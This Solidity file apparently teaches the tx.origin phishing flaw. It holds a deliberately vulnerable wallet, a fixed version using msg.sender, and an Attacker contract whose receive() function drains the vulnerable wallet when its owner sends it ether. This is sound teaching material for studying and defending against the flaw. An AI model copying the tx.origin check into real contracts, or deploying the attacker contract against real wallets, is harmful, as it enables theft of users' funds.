// SPDX-License-Identifier: NONE
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";

contract VulnerableSmallWallet {
    address public owner;

    constructor() {
        owner = tx.origin;
    }

    function withdrawAll(address _recipient) external {
        require(tx.origin == owner, "Caller not authorized");
        payable(_recipient).transfer(address(this).balance);
    }

    receive() external payable {}
}
contract SecureSmallWallet {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function withdrawAll(address _recipient) external {
        require(msg.sender == owner, "Caller not authorized");
        payable(_recipient).transfer(address(this).balance);
    }

    receive() external payable {}
}

interface ISmallWallet {
    function withdrawAll(address _recipient) external;
}

contract Attacker is Ownable {
    ISmallWallet private smallWallet;

    constructor(ISmallWallet _smallWallet) {
        smallWallet = _smallWallet;
    }

    function update(ISmallWallet _smallWallet) public onlyOwner {
        smallWallet = _smallWallet;
    }

    receive() external payable {
        smallWallet.withdrawAll(owner());
    }
}
